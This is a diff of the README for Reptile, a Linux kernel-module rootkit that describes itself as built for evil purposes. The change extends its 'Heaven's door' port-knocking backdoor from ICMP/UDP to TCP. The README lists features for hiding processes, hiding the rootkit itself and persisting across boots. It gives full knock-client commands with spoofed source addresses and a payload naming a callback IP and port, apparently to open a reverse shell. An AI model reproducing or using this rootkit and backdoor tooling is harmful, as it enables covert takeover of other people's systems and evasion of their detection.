@@ -10,7 +10,7 @@ Reptile is a LKM rootkit for evil purposes. If you are searching stuff only for 
 - Hide processes
 - Hide himself
 - Boot persistence
-- Heaven's door - A ICMP/UDP port-knocking backdoor
+- Heaven's door - A ICMP/UDP/TCP port-knocking backdoor
 - Client to knock on heaven's door :D
     
 ## Install
@@ -50,14 +50,14 @@ content to hide
 
 ### Knocking on heaven's door
 
-Heaven's door is a ICMP/UDP port-knocking backdoor used by Reptile. To access the backdoor you can use the client: 
+Heaven's door is a ICMP/UDP/TCP port-knocking backdoor used by Reptile. To access the backdoor you can use the client: 
 ```
 Knock Knock on Heaven's Door
 Writen by: F0rb1dd3n
 
 Usage: ./knock_on_heaven <args>
 
--x      protocol (ICMP/UDP)
+-x      protocol (ICMP/UDP/TCP)
 -s      Source IP address (You can spoof)
 -t      Target IP address
 -p      Source Port
@@ -68,7 +68,9 @@ Usage: ./knock_on_heaven <args>
 [!] ICMP doesn't need ports
 
 ICMP: ./knock_on_heaven -x icmp -s 192.168.0.2 -t 192.168.0.3 -d "F0rb1dd3n 192.168.0.4 4444" -l
-UDP:  ./knock_on_heaven -x udp  -s 192.168.0.2 -t 192.168.0.3 -p 53 -q 53 -d "F0rb1dd3n 192.168.0.4 4444" -l
+UDP:  ./knock_on_heaven -x udp  -s 192.168.0.2 -t 192.168.0.3 -p 666 -q 53 -d "F0rb1dd3n 192.168.0.4 4444" -l
+TCP:  ./knock_on_heaven -x tcp  -s 192.168.0.2 -t 192.168.0.3 -p 666 -q 80 -d "F0rb1dd3n 192.168.0.4 4444" -l
+
 
 ```
 <img src="https://i.imgur.com/UaChWK8.png">
